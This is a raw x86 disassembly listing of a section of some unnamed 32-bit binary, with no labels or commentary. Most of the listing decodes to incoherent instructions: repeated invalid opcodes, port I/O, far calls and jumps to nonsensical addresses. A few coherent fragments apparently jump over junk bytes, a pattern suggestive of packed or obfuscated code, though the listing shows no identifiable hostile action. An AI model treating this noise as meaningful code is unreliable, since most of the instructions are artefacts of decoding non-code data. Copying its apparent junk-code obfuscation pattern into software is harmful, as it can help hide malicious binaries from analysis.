  406be6:	rcr    DWORD PTR [eax+0x65],cl
  406be9:	and    BYTE PTR [esi+0x6a],cl
  406bec:	mov    dl,0x15
  406bee:	pop    ss
  406bef:	lds    ecx,FWORD PTR [esi-0x614947da]
  406bf5:	cmc    
  406bf6:	cmc    
  406bf7:	test   al,0xfb
  406bf9:	faddp  st(7),st
  406bfb:	adc    DWORD PTR [ebx],eax
  406bfd:	(bad)  
  406bfe:	jl     0x406bfb
  406c00:	lahf   
  406c01:	add    al,0xfb
  406c03:	push   ebx
  406c04:	jne    0x406c74
  406c06:	jp     0x406c4d
  406c08:	or     eax,0x85a4ebb4
  406c0d:	int    0xb5
  406c0f:	loop   0x406bb1
  406c11:	mov    esi,0x3f930c7a
  406c16:	je     0x406c10
  406c18:	mov    ch,bh
  406c1a:	xchg   ecx,eax
  406c1b:	std    
  406c1c:	call   0xa2bf6b3b
  406c21:	push   ebx
  406c22:	sar    DWORD PTR [edi-0xf],1
  406c25:	js     0x406c75
  406c27:	inc    ebp
  406c28:	not    DWORD PTR [edx]
  406c2a:	fldcw  WORD PTR ds:0xdbfdfd3b
  406c30:	lods   eax,DWORD PTR ds:[esi]
  406c31:	inc    ebp
  406c32:	mov    DWORD PTR [ecx],ebx
  406c34:	arpl   bx,dx
  406c36:	je     0x406bbe
  406c38:	sub    eax,0xbc656367
  406c3d:	lock push cs
  406c3f:	jecxz  0x406c0c
  406c41:	push   esi
  406c42:	jne    0x406c47
  406c44:	(bad)  
  406c45:	das    
  406c46:	repz and ch,BYTE PTR [ecx]
  406c49:	jo     0x406c96
  406c4b:	inc    edx
  406c4c:	outs   dx,BYTE PTR ds:[esi]
  406c4d:	pop    ebp
  406c4e:	ja     0x406c31
  406c50:	clc    
  406c51:	add    DWORD PTR [ecx-0x12d8235d],0x1d6691ac
  406c5b:	adc    eax,0x679feafb
  406c60:	mov    esp,0x80938d5b
  406c65:	mov    WORD PTR [esi+eax*1],gs
  406c68:	bound  ebp,QWORD PTR [edi-0x7be2a4d0]
  406c6e:	fst    QWORD PTR [ebp+eax*8+0x63298a6d]
  406c75:	adc    ch,BYTE PTR [edi+0x36601a40]
  406c7b:	icebp  
  406c7c:	cmc    
  406c7d:	mov    ebx,0x1d2af9ee
  406c82:	popf   
  406c83:	or     esi,edx
  406c85:	push   esi
  406c86:	js     0x406cf2
  406c88:	call   0xd58b:0xf4d08009
  406c8f:	push   eax
  406c90:	and    al,0x49
  406c92:	cs jecxz 0x406d0c
  406c95:	jno    0x406c25
  406c97:	fisub  WORD PTR [ecx+edx*1+0x1201ed3e]
  406c9e:	enter  0xfa0a,0x15
  406ca2:	xchg   esi,eax
  406ca3:	sub    eax,0xfa4c043a
  406ca8:	or     BYTE PTR [edx-0x6bf9f3bf],bh
  406cae:	repz cmp sp,0xffcc
  406cb3:	repz sub eax,0x6d356965
  406cb9:	les    edx,FWORD PTR [eax]
  406cbb:	std    
  406cbc:	pop    es
  406cbd:	inc    edx
  406cbe:	in     al,0x51
  406cc0:	shl    DWORD PTR cs:[ebp+esi*1+0x33974ab4],0xfb
  406cc9:	pop    edx
  406cca:	mov    al,BYTE PTR [edx+edx*4-0x623acac8]
  406cd1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406cd2:	aad    0xce
  406cd4:	mov    ch,BYTE PTR [esi-0x34]
  406cd7:	sub    al,0x9c
  406cd9:	cmp    ah,bl
  406cdb:	push   eax
  406cdc:	inc    ebx
  406cdd:	ficom  WORD PTR [edi+0x5d015ca]
  406ce3:	les    esi,FWORD PTR [esi*2-0x372c3398]
  406cea:	sbb    DWORD PTR [ebp+0x2e0657d2],0xffffffba
  406cf1:	jmp    0x406ccb
  406cf3:	pop    edx
  406cf4:	cmp    esi,DWORD PTR [edi]
  406cf6:	and    ecx,eax
  406cf8:	mov    BYTE PTR [esi],cl
  406cfa:	gs mov dl,0x8e
  406cfd:	ss push cs
  406cff:	sub    eax,0xc54b741f
  406d04:	sub    DWORD PTR [eax+0x46],esi
  406d07:	lahf   
  406d08:	in     eax,0x43
  406d0a:	test   al,0x21
  406d0c:	daa    
  406d0d:	or     al,0x90
  406d0f:	aad    0xd2
  406d11:	add    DWORD PTR [edi+0x4e],esi
  406d14:	or     DWORD PTR [ebx],0xbcb4f239
  406d1a:	adc    edx,DWORD PTR [ebx]
  406d1c:	adc    DWORD PTR [ebp-0x17],ebp
  406d1f:	mov    DWORD PTR [edx+0x4d],edx
  406d22:	ins    BYTE PTR es:[edi],dx
  406d23:	xor    eax,0x2f
  406d26:	pop    edx
  406d27:	xchg   ebx,eax
  406d28:	dec    ebx
  406d29:	sbb    eax,ebp
  406d2b:	js     0x406da2
  406d2d:	out    0x4,al
  406d2f:	push   ss
  406d30:	idiv   al
  406d32:	loop   0x406ce4
  406d34:	icebp  
  406d35:	cwde   
  406d36:	push   esi
  406d37:	xchg   edi,eax
  406d38:	jmp    0x406d65
  406d3a:	scas   al,BYTE PTR es:[edi]
  406d3b:	cmp    al,0xf0
  406d3d:	(bad)  
  406d3e:	sti    
  406d3f:	fst    DWORD PTR [ebp-0x67]
  406d42:	test   al,0x61
  406d44:	sbb    al,0xa3
  406d46:	lahf   
  406d47:	test   BYTE PTR gs:[eax+0x32],bl
  406d4b:	pushf  
  406d4c:	inc    eax
  406d4d:	pop    esi
  406d4e:	mov    ebp,0xc1336677
  406d53:	mov    ecx,0x3b02
  406d58:	sbb    DWORD PTR ds:0x43372f,0x433613
  406d62:	add    ax,cx
  406d65:	add    DWORD PTR ds:0x433723,0x7d57
  406d6f:	mov    ecx,DWORD PTR [ebp+0x8]
  406d72:	movzx  eax,ax
  406d75:	sbb    DWORD PTR ds:0x433663,0x43360f
  406d7f:	jmp    0x406f5e
  406d84:	cmp    DWORD PTR [ebx],ebp
  406d86:	es fdivrp st(4),st
  406d89:	repz shr DWORD PTR [ecx],0x6c
  406d8d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406d8e:	pop    esi
  406d8f:	xor    al,0x10
  406d91:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406d92:	test   eax,0x7e384077
  406d97:	jle    0x406d55
  406d99:	jg     0x406e19
  406d9b:	jle    0x406de9
  406d9d:	outs   dx,DWORD PTR ds:[esi]
  406d9e:	and    al,0xd
  406da0:	push   edx
  406da1:	loope  0x406db6
  406da3:	push   ebx
  406da4:	pop    es
  406da5:	dec    esi
  406da6:	enter  0x8f11,0x2b
  406daa:	sti    
  406dab:	xchg   edx,eax
  406dac:	daa    
  406dad:	pop    es
  406dae:	jns    0x406e09
  406db0:	inc    eax
  406db1:	sar    eax,1
  406db3:	call   0x368b6214
  406db8:	dec    ebp
  406db9:	repz fcom QWORD PTR [edi+0x2950bab7]
  406dc0:	push   esi
  406dc1:	lahf   
  406dc2:	fxch   st(6)
  406dc4:	call   0xd77edfd6
  406dc9:	std    
  406dca:	jle    0x406de4
  406dcc:	(bad)  
  406dcd:	pop    es
  406dce:	adc    eax,0x60573d85
  406dd3:	sub    ecx,DWORD PTR [esi+0x29cfc9c1]
  406dd9:	nop
  406dda:	inc    eax
  406ddb:	mov    bl,0xb3
  406ddd:	push   ebp
  406dde:	cmp    eax,esp
  406de0:	cmp    DWORD PTR [ebp-0x48],ebx
  406de3:	inc    esp
  406de4:	hlt    
  406de5:	in     al,0xc4
  406de7:	dec    esi
  406de8:	mov    edi,0x1e670f1e
  406ded:	out    0x80,eax
  406def:	mov    edi,0xabb8980a
  406df4:	pop    ecx
  406df5:	int3   
  406df6:	mov    edi,0x5af2b47f
  406dfb:	dec    ecx
  406dfc:	mov    esp,0x8c1915af
  406e01:	pop    ds
  406e02:	mov    esi,0x19374843
  406e07:	aas    
  406e08:	retf   0x79eb
  406e0b:	or     eax,0xe5600891
  406e10:	mov    al,0xd6
  406e12:	sbb    esi,DWORD PTR [ecx+eiz*1]
  406e15:	into   
  406e16:	xor    eax,0x7b870c20
  406e1b:	ins    BYTE PTR es:[edi],dx
  406e1c:	mov    ecx,0xe380cc2c
  406e21:	dec    ebp
  406e22:	pop    es
  406e23:	ror    BYTE PTR [edi],1
  406e25:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406e26:	clc    
  406e27:	outs   dx,DWORD PTR ds:[esi]
  406e28:	sar    BYTE PTR [edx-0x52],1
  406e2b:	inc    ecx
  406e2c:	cmp    BYTE PTR [edx-0x4],ah
  406e2f:	or     DWORD PTR [esi+0x3c01890b],0x6929896e
  406e39:	lahf   
  406e3a:	mov    ds:0xa523122c,al
  406e3f:	sub    al,BYTE PTR [edi]
  406e41:	xchg   DWORD PTR [ebx+0x20c9c61c],ebp
  406e47:	inc    ecx
  406e48:	outs   dx,DWORD PTR ds:[esi]
  406e49:	or     eax,0xe4d361ec
  406e4e:	imul   ebp,DWORD PTR [edi-0x34],0xfffffffc
  406e52:	test   edi,eax
  406e54:	int3   
  406e55:	and    WORD PTR [edx],bx
  406e58:	or     DWORD PTR [edx],0xab9f78f5
  406e5e:	data16 aaa 
  406e60:	jecxz  0x406e6a
  406e62:	fidivr DWORD PTR [ecx+0x5e]
  406e65:	arpl   WORD PTR [esi+ecx*8],sp
  406e68:	sbb    eax,0xc7f6ba29
  406e6d:	push   ebx
  406e6e:	dec    ebx
  406e6f:	aam    0x42
  406e71:	jae    0x406e62
  406e73:	popf   
  406e74:	push   esi
  406e75:	shr    BYTE PTR [edi],1
  406e77:	ins    BYTE PTR es:[edi],dx
  406e78:	(bad)  
  406e79:	loopne 0x406ecb
  406e7b:	cdq    
  406e7c:	xor    DWORD PTR [ebp+0x7a],0x1964828b
  406e83:	sub    al,0xe2
  406e85:	aam    0x4b
  406e87:	aad    0x71
  406e89:	cmp    BYTE PTR [esi],dh
  406e8b:	mov    bh,0x50
  406e8d:	loopne 0x406ed6
  406e8f:	out    dx,al
  406e90:	mov    cl,0x4f
  406e92:	or     al,BYTE PTR [esi]
  406e94:	sub    ebx,DWORD PTR [bp+di-0x6f]
  406e98:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406e99:	aam    0x6c
  406e9b:	pusha  
  406e9c:	out    0xa3,eax
  406e9e:	daa    
  406e9f:	inc    edi
  406ea0:	sbb    edi,DWORD PTR [esi-0x2cc28b07]
  406ea6:	leave  
  406ea7:	push   es
  406ea8:	jge    0x406e55
  406eaa:	xchg   edx,eax
  406eab:	jno    0x406e83
  406ead:	std    
  406eae:	(bad)  
  406eaf:	lods   eax,DWORD PTR ds:[esi]
  406eb0:	jae    0x406ed5
  406eb2:	js     0x406e4d
  406eb4:	scas   eax,DWORD PTR es:[edi]
  406eb5:	mov    ebx,0xd047049f
  406eba:	pop    ecx
  406ebb:	push   esi
  406ebc:	sbb    cl,ch
  406ebe:	xchg   DWORD PTR [edx],ebx
  406ec0:	int    0x9d
  406ec2:	inc    ebp
  406ec3:	mul    BYTE PTR [edi]
  406ec5:	jge    0x406f19
  406ec7:	test   DWORD PTR [esi],eax
  406ec9:	push   es
  406eca:	outs   dx,BYTE PTR ds:[esi]
  406ecb:	inc    edi
  406ecc:	mov    esp,0x74ee479e
  406ed1:	not    DWORD PTR [ecx+0x6c]
  406ed4:	inc    ebx
  406ed5:	pop    eax
  406ed6:	lods   eax,DWORD PTR ds:[esi]
  406ed7:	out    0x61,eax
  406ed9:	push   ebx
  406eda:	inc    ebp
  406edb:	lock or al,0xda
  406edf:	pop    ds
  406ee0:	repz xor DWORD PTR [edi-0x32c18179],eax
  406ee7:	push   eax
  406ee8:	mov    ebp,0xc73429c4
  406eed:	enter  0xd35d,0x1d
  406ef1:	ja     0x406f37
  406ef3:	lods   eax,DWORD PTR ds:[esi]
  406ef4:	sar    DWORD PTR [edx],cl
  406ef6:	out    dx,eax
  406ef7:	mov    ds:0xa43ca966,eax
  406efc:	imul   ecx,DWORD PTR [esi-0x1c],0xffffffec
  406f00:	les    esp,FWORD PTR [edi+0x30]
  406f03:	fs fcmovnbe st,st(5)
  406f06:	mov    ds:0x7bb3c218,al
  406f0b:	ret    
  406f0c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406f0d:	mov    edi,0xc068ad88
  406f12:	pushf  
  406f13:	in     eax,dx
  406f14:	(bad)  
  406f16:	out    0xb6,al
  406f18:	call   0xe956:0x7218970a
  406f1f:	popa   
  406f20:	dec    esi
  406f21:	popa   
  406f22:	mov    ecx,0x3abd1c24
  406f27:	cmp    al,0x42
  406f29:	cmp    al,0x7b
  406f2b:	sbb    ebx,DWORD PTR [edx]
  406f2d:	in     eax,dx
  406f2e:	inc    ecx
  406f2f:	dec    esi
  406f30:	inc    ebx
  406f31:	pop    edi
  406f32:	sub    edx,eax
  406f34:	xchg   edx,eax
  406f35:	push   DWORD PTR ds:[ecx]
  406f38:	mov    ds:0xcf9af91b,eax
  406f3d:	fxch   st(3)
  406f3f:	in     eax,dx
  406f40:	cdq    
  406f41:	bound  eax,QWORD PTR [ebx*2-0x58d2adb3]
  406f48:	xchg   ebp,eax
  406f49:	cmp    cl,ch
  406f4b:	push   ecx
  406f4c:	shr    DWORD PTR [ecx],cl
  406f4e:	dec    esi
  406f4f:	pop    edi
  406f50:	les    ebp,FWORD PTR [eax]
  406f52:	push   ss
  406f53:	ins    DWORD PTR es:[edi],dx
  406f54:	je     0x406f66
  406f56:	mov    esi,0xf96aff3c
  406f5b:	in     eax,dx
  406f5c:	adc    BYTE PTR [eax],ch
  406f5e:	not    eax
  406f60:	and    DWORD PTR ds:0x43360f,0x433653
  406f6a:	and    eax,DWORD PTR [ecx]
  406f6c:	mov    ecx,DWORD PTR [ebp+0x8]
  406f6f:	mov    DWORD PTR [ecx],eax
  406f71:	jmp    0x406f7d
  406f76:	xor    DWORD PTR [ebp-0x4],0xe149eb8
  406f7d:	mov    ax,WORD PTR [ebp-0x8]
  406f81:	jmp    0x407160
  406f86:	dec    ebx
  406f87:	rcr    BYTE PTR [ecx],0x72
  406f8a:	mov    cl,0x73
  406f8c:	push   ecx
  406f8d:	loope  0x406f7e
  406f8f:	sahf   
  406f90:	adc    al,BYTE PTR ds:0xe74c3244
  406f96:	mov    es,esi
  406f98:	jle    0x407018
  406f9a:	mov    esp,0x417e7e7f
  406f9f:	mov    ds:0x49392a01,al
  406fa4:	push   ebp
  406fa5:	xchg   esp,eax
  406fa6:	cmc    
  406fa7:	fs push esi
  406fa9:	bound  ebx,QWORD PTR [ebx]
  406fab:	push   ebx
  406fac:	das    
  406fad:	push   ss
  406fae:	sbb    cl,dh
  406fb0:	adc    DWORD PTR [esp+eiz*2],ebx
  406fb3:	sbb    eax,0x3eed9ebe
  406fb8:	add    al,0x81
  406fba:	stc    
  406fbb:	mov    al,ch
  406fbd:	fwait
  406fbe:	or     DWORD PTR [edx+0x20],eax
  406fc1:	pusha  
  406fc2:	and    al,0xb3
  406fc4:	pop    esi
  406fc5:	in     eax,0xf7
  406fc7:	stc    
  406fc8:	(bad)  
  406fc9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406fca:	push   ss
  406fcb:	out    dx,eax
  406fcc:	sub    BYTE PTR [eax],0x70
  406fcf:	not    DWORD PTR [ecx+0x5bb54ea2]
  406fd5:	test   DWORD PTR [eax],ebx
  406fd7:	cld    
  406fd8:	repnz xor al,0xb0
  406fdb:	dec    ebx
  406fdc:	lock inc BYTE PTR [ecx-0x343d5cb7]
  406fe3:	stos   DWORD PTR es:[edi],eax
  406fe4:	inc    ecx
  406fe5:	push   0x47c725e2
  406fea:	inc    eax
  406feb:	enter  0x4f5a,0x88
  406fef:	(bad)  
  406ff0:	and    DWORD PTR [edx],edx
  406ff2:	inc    esp
  406ff3:	dec    ebp
  406ff4:	mov    ebx,DWORD PTR [edx+esi*1+0x74e7c78e]
  406ffb:	push   edx
  406ffc:	mov    ?,WORD PTR [ebx-0x1648b819]
  407002:	xchg   edi,eax
  407003:	lods   al,BYTE PTR ds:[esi]
  407004:	jae    0x406ff9
  407006:	retf   
  407007:	or     DWORD PTR [ecx+ebp*2],esp
  40700a:	mov    eax,0x23ebff2a
  40700f:	pop    ebp
  407010:	pop    ebp
  407011:	dec    esp
  407012:	pusha  
  407013:	mov    WORD PTR [edi+0xddb2aed],fs
  407019:	sti    
  40701a:	iret   
  40701b:	push   esi
  40701c:	add    BYTE PTR [ecx+0x87de6d3],al
  407022:	push   ss
  407023:	or     ebx,edx
  407025:	sbb    esi,0xffffffa2
  407028:	pop    ebx
  407029:	jp     0x40704d
  40702b:	aaa    
  40702c:	ret    0xfb2e
  40702f:	sub    eax,0x2319adfc
  407034:	mov    fs,WORD PTR [ebp-0x6a]
  407037:	xchg   ecx,eax
  407038:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407039:	pop    ecx
  40703a:	imul   edx,DWORD PTR [eax-0x4df1cb0e],0xffffffc3
  407041:	pop    eax
  407042:	ins    BYTE PTR es:[edi],dx
  407043:	shl    esi,1
  407045:	or     BYTE PTR [esi],al
  407047:	imul   esp,DWORD PTR [ebx],0xde26d1e4
  40704d:	mov    ecx,0x97b6f892
  407052:	xchg   ecx,eax
  407053:	jle    0x4070b2
  407055:	pop    esi
  407056:	push   cs
  407057:	push   edx
  407058:	xor    bl,cl
  40705a:	push   esp
  40705b:	pusha  
  40705c:	fsubrp st(3),st
  40705e:	or     eax,0x4aea49e5
  407063:	cmp    bl,BYTE PTR [ecx+ecx*1]
  407066:	push   eax
  407067:	xchg   edx,eax
  407068:	mov    bl,0xfa
  40706a:	sbb    ebp,DWORD PTR [esi-0x6d8ab48f]
  407070:	popa   
  407071:	loop   0x4070f1
  407073:	cmc    
  407074:	pop    edx
  407075:	nop
  407076:	imul   esp,esp,0x876f1b3
  40707c:	sahf   
  40707d:	and    eax,0xdb31d6c2
  407082:	inc    edi
  407083:	add    ebx,DWORD PTR [ebx-0x7e]
  407086:	ficom  WORD PTR [eax]
  407088:	sub    ebp,DWORD PTR [ecx+0x20]
  40708b:	adc    eax,0x1abd9da6
  407090:	in     al,0x5
  407092:	fwait
  407093:	jle    0x407022
  407095:	nop
  407096:	adc    al,0xd4
  407098:	pop    edi
  407099:	and    ebp,esi
  40709b:	fbld   TBYTE PTR [ebx+0x7f98e76d]
  4070a1:	sar    al,1
  4070a3:	(bad)  [eax]
  4070a5:	inc    eax
  4070a6:	fistp  WORD PTR [edi-0x6d1e9573]
  4070ac:	add    al,0x8d
  4070ae:	ds inc eax
  4070b0:	cmp    BYTE PTR [esp+ebp*8-0x4e],al
  4070b4:	cmp    al,0xa7
  4070b6:	scas   eax,DWORD PTR es:[edi]
  4070b7:	scas   eax,DWORD PTR es:[edi]
  4070b8:	push   esp
  4070b9:	and    esp,DWORD PTR [ecx-0x37]
  4070bc:	stos   DWORD PTR es:[edi],eax
  4070bd:	in     eax,dx
  4070be:	adc    DWORD PTR [esi],edi
  4070c0:	les    edx,FWORD PTR [ebp+0x1babef8a]
  4070c6:	adc    DWORD PTR [esi+0x3c5caaf1],0x140c0836
  4070d0:	imul   ecx,DWORD PTR [ebx+0x47],0xe49f347e
  4070d7:	pushf  
  4070d8:	cli    
  4070d9:	pushf  
  4070da:	cwde   
  4070db:	loope  0x4070da
  4070dd:	pop    es
  4070de:	pop    es
  4070df:	retf   0x15e6
  4070e2:	push   es
  4070e3:	and    eax,0x50f112a1
  4070e8:	ja     0x40715d
  4070ea:	loope  0x40709f
  4070ec:	inc    esp
  4070ed:	cmp    al,0x2c
  4070ef:	ja     0x40711d
  4070f1:	lock test al,0x1d
  4070f4:	cmp    BYTE PTR [ebx+0x43],0xf6
  4070f8:	cmc    
  4070f9:	std    
  4070fa:	or     esi,DWORD PTR ss:[eax+0x6b]
  4070fe:	add    al,0x6a
  407100:	mov    ebx,0x5e7140f3
  407105:	loope  0x4070df
  407107:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407108:	inc    eax
  407109:	test   DWORD PTR [edx+0x34],esp
  40710c:	dec    esi
  40710d:	sub    esi,ebx
  40710f:	fidivr WORD PTR [edx+0x2813dd78]
  407115:	mov    ebp,edi
  407117:	fimul  DWORD PTR [eax+edi*2+0x2253d22b]
  40711e:	xlat   BYTE PTR ds:[ebx]
  40711f:	mov    al,ds:0xa0a0d2e3
  407124:	pop    edx
  407125:	fisttp DWORD PTR [ebx-0x7ffe4167]
  40712b:	into   
  40712c:	push   ss
  40712d:	call   0x583c1fe3
  407132:	sbb    ah,BYTE PTR [ebp+0x1b9f2e4]
  407138:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407139:	xor    al,BYTE PTR [eax-0x3c746d09]
  40713f:	inc    ebp
  407140:	mov    esp,0xeccbce2f
  407145:	pop    ss
  407146:	cmp    bl,0x7a
  407149:	dec    edi
  40714a:	movs   BYTE PTR es:[edi],BYTE PTR cs:[esi]
  40714c:	dec    ecx
  40714d:	les    esp,FWORD PTR [eax+0x6f8c5ae]
  407153:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407154:	jb     0x407174
  407156:	mov    edx,0x1c563cef
  40715b:	lea    esp,[ebp+0x22]
  40715e:	xchg   ecx,eax
  40715f:	sar    bh,0x75
  407162:	or     al,ch
  407164:	jmp    0x407167
  407166:	add    BYTE PTR [eax],al
  407168:	test   eax,eax
  40716a:	jmp    0x407349
  40716f:	and    eax,0xb1edb090
  407174:	in     eax,dx
  407175:	popa   
  407176:	push   eax
  407177:	retf   
  407178:	xchg   BYTE PTR [ebx-0x74],dh
  40717b:	test   ecx,eax
  40717d:	push   cs
  40717e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40717f:	int3   
  407180:	les    edi,FWORD PTR [esi+0x7e]
  407183:	mov    esp,0x927e7e7f
  407188:	cmp    DWORD PTR ds:0x34832ae7,esp
  40718e:	mov    al,0xfb
  407190:	dec    eax
  407191:	adc    DWORD PTR [ebp+0x5a],eax
  407194:	aam    0xcc
  407196:	int    0x7b
  407198:	arpl   WORD PTR [edx],sp
  40719a:	xlat   BYTE PTR ds:[ebx]
  40719b:	and    dl,BYTE PTR [eax-0x26]
  40719e:	(bad)  
  40719f:	test   edi,0xdce90f40
  4071a5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4071a6:	shr    DWORD PTR [esi],1
  4071a8:	repz sbb BYTE PTR [edi+0x2a2b8b48],0xc7
  4071b0:	xchg   edx,eax
  4071b1:	sbb    eax,0x3436903a
  4071b6:	mov    ch,0xed
  4071b8:	loopne 0x407160
  4071ba:	cmp    dh,BYTE PTR [edx-0x9a5060f]
  4071c0:	sti    
  4071c1:	sbb    eax,DWORD PTR [edi]
  4071c3:	outs   dx,BYTE PTR ds:[esi]
  4071c4:	loope  0x4071a9
  4071c6:	sbb    DWORD PTR [eax-0x1a8fa09d],esi
  4071cc:	xor    DWORD PTR [edi],edi
  4071ce:	cmp    edx,DWORD PTR [esi]
  4071d0:	iret   
  4071d1:	inc    esp
  4071d2:	mov    al,ds:0x69084fa8
  4071d7:	cmc    
  4071d8:	call   0xc72f234f
  4071dd:	and    al,0xeb
  4071df:	pop    ecx
  4071e0:	xor    eax,0x8c33c46c
  4071e5:	pop    ebp
  4071e6:	xlat   BYTE PTR ds:[ebx]
  4071e7:	adc    bl,BYTE PTR [esi+0xefc1c51]
  4071ed:	inc    esp
  4071ee:	pop    esi
  4071ef:	pop    ecx
  4071f0:	jmp    ecx
  4071f2:	push   eax
  4071f3:	sbb    al,0xc7
  4071f5:	inc    ebp
  4071f6:	dec    eax
  4071f7:	pop    ebx
  4071f8:	mov    eax,ds:0xb915a790
  4071fd:	sub    eax,0x265d7c4
  407202:	cmp    al,0xa0
  407204:	fild   DWORD PTR [eax]
  407206:	test   eax,0xad148576
  40720b:	aas    
  40720c:	fisubr WORD PTR [ebp-0x5b]
  40720f:	inc    eax
  407210:	std    
  407211:	push   DWORD PTR [eax]
  407213:	(bad)  
  407214:	xor    BYTE PTR [ebx+0x6f],dl
  407217:	in     al,dx
  407218:	sub    al,0x3c
  40721a:	cmc    
  40721b:	pop    eax
  40721c:	jmp    0x9ee3520
  407221:	aas    
  407222:	(bad)  
  407223:	jmp    0xb5fcc468
  407228:	xchg   ecx,eax
  407229:	(bad)  
  40722a:	jo     0x40727c
  40722c:	ja     0x40729a
  40722e:	popa   
  40722f:	push   ss
  407230:	push   0xb00862df
  407235:	stc    
  407236:	imul   bp,WORD PTR ds:0x911aec78,0xb524
  40723f:	(bad)  
  407241:	adc    DWORD PTR ds:0x53fe1c5d,eax
  407247:	mov    bh,0xa0
  407249:	or     eax,0x4c1107ec
  40724e:	dec    ebx
  40724f:	popa   
  407250:	es pop eax
  407252:	and    BYTE PTR [eax+edi*1+0x5c],dl
  407256:	jae    0x4071e8
  407258:	push   0x663232b6
  40725d:	sbb    DWORD PTR [esi],ebx
  40725f:	sbb    eax,0xa48abad3
  407264:	(bad)  
  407265:	or     al,0xbd
  407267:	dec    ebp
  407268:	or     al,0xc1
  40726a:	mov    dh,0x25
  40726c:	test   DWORD PTR [ebp*4+0x364792b2],ecx
  407273:	aam    0x9
  407275:	fistp  QWORD PTR ds:0xeac11639
  40727b:	std    
  40727c:	in     eax,dx
  40727d:	push   ecx
  40727e:	in     eax,dx
  40727f:	mov    DWORD PTR [ebx+ecx*4-0xb249f2b],eax
  407286:	aam    0x26
  407288:	retf   0xc69f
  40728b:	pusha  
  40728c:	lock popa 
  40728e:	loop   0x407220
  407290:	jne    0x407232
  407292:	or     ch,BYTE PTR [edi-0x52]
  407295:	js     0x40728d
  407297:	int    0xa4
  407299:	rcl    ebp,0xf3
  40729c:	sub    DWORD PTR [edi+0x2b],esp
  40729f:	je     0x407289
  4072a1:	xchg   esp,eax
  4072a2:	dec    ecx
  4072a3:	cdq    
  4072a4:	loopne 0x40723b
  4072a6:	outs   dx,DWORD PTR ds:[esi]
  4072a7:	and    al,BYTE PTR [ebx-0x2e]
  4072aa:	mov    dh,BYTE PTR [ecx-0x34e96a37]
  4072b0:	and    al,0x4b
  4072b2:	pop    ecx
  4072b3:	add    al,0x74
  4072b5:	mov    eax,ds:0x98b5ab3e
  4072ba:	mov    al,ds:0x6217386c
  4072bf:	mov    dl,0xc8
  4072c1:	mov    al,cs:0xa9fd1114
  4072c7:	sbb    BYTE PTR gs:[ecx+eiz*1-0x8],bl
  4072cc:	aas    
  4072cd:	fst    QWORD PTR [esi]
  4072cf:	mov    bh,0x19
  4072d1:	sbb    eax,0x69ecb662
  4072d6:	in     al,0xb0
  4072d8:	mov    bh,0x36
  4072da:	loope  0x4072bb
  4072dc:	jnp    0x4072b8
  4072de:	inc    edi
  4072df:	jg     0x40727e
  4072e1:	jbe    0x407359
  4072e3:	xchg   ebp,eax
  4072e4:	jb     0x40726d
  4072e6:	leave  
  4072e7:	inc    esi
  4072e8:	cmp    dh,BYTE PTR [eax+0x2f66ea53]
  4072ee:	sbb    dl,BYTE PTR [edx]
  4072f0:	aam    0x40
  4072f2:	adc    BYTE PTR [esi-0x16665d5c],ah
  4072f8:	mov    es,WORD PTR [ebx+0x74191d91]
  4072fe:	test   bh,cl
  407300:	add    edi,ebp
  407302:	imul   ecx,DWORD PTR [eax+ecx*8],0x783d1179
  407309:	mov    esp,0xdf1d8765
  40730e:	ss jmp 0x1858412b
  407314:	popf   
  407315:	mov    ebp,eax
  407317:	hlt    
  407318:	dec    edx
  407319:	xor    ebp,ebx
  40731b:	repnz in al,0x53
  40731e:	jo     0x407373
  407320:	cmp    BYTE PTR [esi+eiz*1-0x74],ch
  407324:	push   0x6e
  407326:	jb     0x9993bfbb
  40732c:	outs   dx,DWORD PTR ds:[esi]
  40732d:	ss pop es
  40732f:	aad    0xa1
  407331:	xor    DWORD PTR [esi-0x1c],ebp
  407334:	stos   DWORD PTR es:[edi],eax
  407335:	or     edx,eax
  407337:	sub    DWORD PTR [ecx-0x8],0xc8a95e43
  40733e:	bound  edi,QWORD PTR [esi+edx*4+0x3600786c]
  407345:	mov    dl,0xef
  407347:	sub    eax,0x27840f57
  40734c:	cld    
  40734d:	(bad)  
  40734e:	dec    ecx
  407350:	ret    0x4
  407353:	push   ebp
  407354:	mov    ebp,esp
  407356:	sub    esp,0x2c
  407359:	and    DWORD PTR ds:0x433657,0x5787
  407363:	mov    DWORD PTR [ebp-0x8],0xf89c8532
  40736a:	mov    eax,ds:0x43372b
  40736f:	or     DWORD PTR ds:0x43372f,eax
  407375:	jmp    0x40759d
  40737a:	pop    edx
  40737b:	cmp    al,0x59
  40737d:	inc    ebx
  40737e:	pop    ecx
  40737f:	arpl   WORD PTR [eax-0x1b],sp
  407382:	js     0x407389
  407384:	push   esi
  407385:	loope  0x407330
  407387:	inc    ebx
  407388:	leave  
  407389:	ins    BYTE PTR es:[edi],dx
  40738a:	or     al,dl
  40738c:	jle    0x40740c
  40738e:	add    eax,0x367e7e7c
  407393:	dec    ebp
  407394:	(bad)  
  407395:	scas   eax,DWORD PTR es:[edi]
  407396:	adc    BYTE PTR [ebp-0x64dd52ee],al
  40739c:	mov    ebx,0x5ce06da8
  4073a1:	pop    esp
  4073a2:	test   BYTE PTR [esi-0x73f03923],dl
  4073a8:	push   eax
  4073a9:	dec    edi
  4073aa:	pop    ss
  4073ab:	jge    0x407363
  4073ad:	jecxz  0x4073d9
  4073af:	rcr    BYTE PTR [esi+0x11],cl
  4073b2:	leave  
  4073b3:	stos   DWORD PTR es:[edi],eax
  4073b4:	pop    eax
  4073b5:	sub    eax,0xe08a94cf
  4073ba:	std    
  4073bb:	pop    esi
  4073bc:	or     al,0x65
  4073be:	hlt    
  4073bf:	cld    
  4073c0:	pop    edx
  4073c1:	cmp    BYTE PTR ds:0xbddc9d6c,dl
  4073c7:	jmp    0x5bb4b739
  4073cc:	jns    0x40741d
